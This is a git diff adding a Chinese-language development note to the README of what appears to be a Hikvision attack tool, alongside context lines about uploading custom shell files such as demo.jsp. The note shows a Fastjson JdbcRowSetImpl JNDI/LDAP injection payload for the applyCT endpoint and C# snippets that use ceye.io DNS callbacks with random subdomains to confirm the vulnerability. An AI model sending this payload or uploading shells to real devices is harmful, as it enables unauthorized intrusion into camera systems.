@@ -100,6 +100,42 @@ cmd
 填入你要的shell代码，文件名，如demo.jsp
 点击自定义上传即可
 
+# 编写小记
+Hikvision applyCT ceye api精准识别技巧
+目前已取消，考虑到批量识别可能会阻塞网络，因此没有采取这个方法
+{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://"\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}
+默认
+默认插入POST json数据进行测试
+访问api:
+查找id:
+id	"1870408864"
+这里存在一个问题
+如果dns缓存不清除，可能存在误判
+{"meta": {"code": 200, "message": "OK"}, "data": [{"id": "1870408864", "name": "", "remote_addr": 
+这里会造成误判，DNS缓存清除需要cookie
+那么怎么不使用COOKIE解决这个问题呢？
+可以直接在调用前，产生随机数
+   Random random = new Random();
+    int randomNumber = random.Next(1, 100); // 生成一个1到100之间的随机整数
+   Console.WriteLine(randomNumber);
+然后进行拼接：然后直接赋给   randomNumber + "." + textBox4.Text;
+这样每一次生成都是会递增的循环产生随机数
+如9090.38.22.xxxx.ceye.io
+2222.9090.38.22.xxxx.ceye.io
+3422342.9090.38.22.xxxx.ceye.io
+通过访问API token,会查找ID值进行判断
+http://api.ceye.io/v1/records?token=“token&type=dns&filter=
+  if (s.Contains(3422342.9090.38.22.xxxx.ceye.io))
+   {
+比对发出的请求：
+如96.93.13.4.90.38.22.2skv3a.ceye.io
+没发出一次，自动生成1次，这样就判断精准了
+取随机不断的递增，再递增去比较存在的值
+如果找到，就存在漏洞，否则漏洞不存在
+但是这个只适用于单个识别，批量识别还需要写另外验证方法
+
+
+
 
 
 
